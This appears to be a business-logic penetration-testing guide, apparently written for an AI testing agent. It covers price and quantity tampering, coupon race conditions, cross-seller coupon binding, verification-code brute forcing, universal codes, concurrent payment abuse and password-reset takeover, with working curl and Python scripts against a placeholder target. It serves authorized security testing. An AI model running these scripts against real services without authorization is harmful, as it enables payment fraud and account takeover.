> Whether to report is governed only by `~/.grok/rules/vuln-report-format.md`. For the minimum tests with an authenticated session, see `dig-scope` §4.2.3 (add fields, skip steps, one concurrent probe for claims / inventory / coupons). This guide covers testing: test payments / workflows / verification codes; if code delivery / CAPTCHA does not lead to account access, move to the authentication chain rather than stopping halfway.
> The quick-matrix item “Merchant promotion binding” is in §1.4. English business-logic / CHECKLIST / METHODOLOGY / SCENARIOS appendices were removed; payment / workflow / verification-code testing remains in the first half.

---

## 1. Existing knowledge base

# Business Logic Testing Guide

## 1. Payment logic vulnerabilities

### 1.1 Price tampering

```bash
# Change the unit price when submitting the cart
# Capture the order-submission request and modify the price field
POST /api/order/create
{"goodsId": "123", "count": 1, "price": "0.01"}  # Change the original price to 0.01

# Negative price (increases the balance)
{"goodsId": "123", "count": 1, "price": "-100"}
```

### 1.2 Quantity tampering

```bash
# Buy one item but change the request to -1 (may trigger a refund)
{"goodsId": "123", "count": -1, "price": "99.00"}

# Integer overflow (32-bit maximum value)
{"count": 2147483647}
```

### 1.3 Coupon / points vulnerabilities

```bash
# Reuse the same coupon
# Race condition (submit the same coupon simultaneously from multiple threads)
for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/coupon/use" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"couponId": "COUPON123"}' &
done
wait

# Negative points (set a negative value during redemption)
{"points": -1000}  # Expected to increase the balance
```

### 1.4 Merchant promotion binding: attach a coupon to another seller’s product (quick-matrix pointer)

> Core issue: the merchant backend trusts the request `productId` when attaching a promotion / coupon to a product and does not check whether the product belongs to that merchant.
> This is **different from** changing the checkout price, changing the coupon value, or switching to a cheaper SKU at checkout. One quick-matrix entry points to this section.

**Recognize:** a merchant / supplier backend can create threshold-discount or no-threshold coupons / promotions; product-binding endpoints often combine `relate` / `bind` / `attach` / `apply` with `promo` / `salespromotion` / `coupon`; the body contains both a coupon / campaign ID and `productId` / `skuId` / `goodsId`.

**Test:**

1. Using your own merchant account, create a coupon with aggressive terms (no threshold, a large value, ideally not limited to your own product category).  
2. Bind it to one of your own products normally and capture the request.  
3. **Change only** `productId` (or its equivalent) to a product from another seller / category; leave the coupon ID / campaign ID unchanged.  
4. Without logging in, open the customer-facing product / checkout page and inspect the listed and payable prices.  

**Confirmed when:** the coupon reduces the payable price of another seller’s product on the customer-facing site (successful checkout is even stronger). A 200 from the binding endpoint or a new row in the merchant backend is not enough; the customer-facing price must actually change.

**False positives:** binding succeeds but the customer-facing price / checkout does not change; the backend rewrites the product based on the merchant session and only allows the merchant’s own products; or `productId` in the customer checkout request was changed to a cheaper SKU (that is the existing “switch product at checkout” test, not this issue).

Do not confuse this with nearby techniques:

| This test | Do not confuse it with ||
|------|--------|
| The merchant-side coupon-binding endpoint changes which product receives the coupon | Changing `amount` / `coupon_amount` in customer checkout ||
| Your coupon + another seller’s `productId` | Change `productId` to a cheaper SKU at checkout and pay ||
| Verify that the customer-facing price drops | Treat a success row in the merchant backend as sufficient ||

First 30 seconds: if there is a merchant backend, create a coupon → capture the binding request → replace `productId` with one clearly outside your store → open the customer-facing page and check the price.

---

## 2. Verification-code / SMS vulnerabilities

> Confirm a finding only when the test completes an account-takeover / authorization-bypass chain (code disclosure + login, universal code + login, brute force + password change). Triggering code delivery / passing CAPTCHA / trying passwords without account access is not enough; continue to the authentication chain.

### 2.1 Enumerable verification codes

```python
import requests

# Four-digit numeric verification code - try each value
for code in range(0, 10000):
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": f"{code:04d}"})
    if r.json().get("code") == 0:
        print(f"Correct verification code: {code:04d}")
        break

# Check for rate limits (if the first 20 attempts are unrestricted but do not grant access, continue to the authentication chain)
```

### 2.2 Universal verification code

```
Test these verification-code values:
000000, 123456, 888888, 666666
111111, 999999
Empty value: ""
Submit without sending a verification code
```

### 2.3 SMS flooding (briefly check rate limits; do not stop halfway)

> Proving only that a code can be sent is not a confirmed finding. The technical checks below prevent treating the SMS endpoint itself as the primary issue.

```python
# Check send-rate limits (only 1-2 test requests; do not actually flood)
# Check:
# 1. Whether consecutive sends to the same number are rate-limited
# 2. Whether IP-based limits exist
# 3. Whether changing the phone parameter still sends to a fixed number
{"phone": "target phone number", "realPhone": "13800138000"}
```

---

## 3. Race conditions

### 3.1 Concurrent deductions

```python
import threading
import requests

# Balance is 100; submit ten purchases of 100 simultaneously
def consume():
    r = requests.post("https://target.com/api/pay",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"amount": 100})
    print(r.json())

threads = [threading.Thread(target=consume) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

### 3.2 Duplicate submissions

```bash
# Submit the same order request multiple times
for i in $(seq 1 10); do
  curl -X POST "https://target.com/api/order/pay" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"orderId": "ORDER123", "amount": "0.01"}' &
done
```

---

## 4. Account-security vulnerabilities

### 4.1 Account enumeration

```bash
# Registration / login endpoint distinguishes "user does not exist" from "incorrect password"
# Different responses may allow account enumeration

# Check whether registration reveals that a phone number is already registered
curl "https://target.com/api/register/check?phone=13800138000"
# A response of {"exists": true} may allow enumeration
```

### 4.2 Password-recovery logic

```
Test flow:
1. Start password recovery using phone A
2. Obtain the token / link
3. Change the phone in the request to phone B
4. If phone B’s password can then be changed, arbitrary-account password reset is possible
```

### 4.3 Account-takeover vulnerability

```
Scenario: a phone number is reassigned after its previous owner cancels service
1. Register using the reassigned number
2. Try to log in to the account previously bound to it
3. Or check whether rebinding the number sends a verification code to the old number
```

---

## 5. Business-logic bypass

### 5.1 State-machine bypass

```bash
# Normal flow: step 1 → step 2 → step 3 → complete
# Try skipping step 2 and executing step 3 directly
# Or return to step 1 while retaining the result of step 3

# Record each request and replay it individually to see whether validation can be bypassed
```

### 5.2 Test parameters

```
Add to the request:
debug=true / test=1 / internal=1
is_admin=true / role=admin
from_internal=1 / bypass_check=1
```

---
